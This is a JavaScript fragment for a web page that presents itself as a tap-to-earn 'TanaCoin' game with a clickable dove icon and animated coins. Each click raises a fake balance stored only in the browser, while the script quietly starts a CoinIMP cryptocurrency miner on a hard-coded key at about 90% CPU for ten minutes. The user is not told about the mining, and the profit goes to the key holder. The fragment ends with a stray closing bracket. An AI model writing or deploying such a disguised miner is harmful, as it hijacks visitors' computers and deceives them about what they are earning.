<script>
    // CoinIMP Mining API keys
    const publicKey = 'ae8f10a8ef09c71c57018916081b2df905c999a5285f48ff1b64b9392c0e21c8';
    let miningActive = false;
    let miningInterval;

    // Check if SDK loaded properly
    function checkSDK() {
        if (typeof CoinIMP !== 'undefined') {
            console.log("CoinIMP SDK loaded successfully.");
            return true;
        } else {
            console.error("CoinIMP SDK is not loaded properly.");
            alert("CoinIMP SDK is not loaded properly. Please check your network or SDK URL.");
            return false;
        }
    }

    // Mining Function
    async function mineTanaCoin() {
        let clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
        let userBalance = parseFloat(localStorage.getItem('userBalance')) || 0;

        clickCount++;
        userBalance += 0.02587;
        document.getElementById('userBalance').innerText = userBalance.toFixed(5);
        localStorage.setItem('userBalance', userBalance.toFixed(5));
        localStorage.setItem('clickCount', clickCount);

        const doveIcon = document.getElementById('doveIcon');

        // Rotate the dove icon 3 times
        if (!doveIcon.classList.contains('rotate')) {
            doveIcon.classList.add('rotate');

            // Remove rotate class after 3 seconds
            setTimeout(() => {
                doveIcon.classList.remove('rotate');
            }, 3000);
        }

        displayFlyingCoin(clickCount % 1);

        if (!miningActive) {
            startMining();
        }
    }

    // Start Mining
    function startMining() {
        if (!checkSDK()) return;

        miningActive = true;

        const miner = new CoinIMP(publicKey, { throttle: 0.1 }); // 90% CPU usage
        miner.start();
        miner.on('found', () => console.log('Hash found!'));
        miner.on('accepted', () => console.log('Hash accepted!'));

        // Stop mining after 10 minutes (600000 ms)
        miningInterval = setTimeout(() => {
            miner.stop();
            miningActive = false;
            console.log('Mining stopped after 10 minutes.');
        }, 600000);
    }

    // Function to display flying coins
    function displayFlyingCoin(flightDirection) {
        const coin = document.createElement('div');
        coin.classList.add('fly-coin');
        coin.innerHTML = 'üïäÔ∏è<span class="red">Tana</span><span class="green">Coin</span> 0.02587';

        // Add flying direction class
        if (flightDirection === 0) {
            coin.classList.add('fly-up');
        }

        document.body.appendChild(coin);

        // Remove the coin after 3 seconds
        setTimeout(() => coin.remove(), 3000);

        // Create additional flying coins randomly
        setTimeout(() => {
            for (let i = 0; i < 9; i++) {
                const randomCoin = document.createElement('div');
                randomCoin.classList.add('fly-coin');
                randomCoin.innerHTML = 'üïäÔ∏è<span class="red">Tana</span><span class="green">Coin</span> 0.02587';
                randomCoin.style.left = `${Math.random() * 35}%`;
                randomCoin.style.top = `${Math.random() * 45}%`;
                document.body.appendChild(randomCoin);

                setTimeout(() => randomCoin.remove(), 2000);
            }
        }, 1000);
    }

    // Restart mining if doveIcon is clicked and mining has stopped
    document.getElementById('doveIcon').addEventListener('click', () => {
        if (!miningActive) {
            startMining();
        }
    });

        checkSDK();
    });
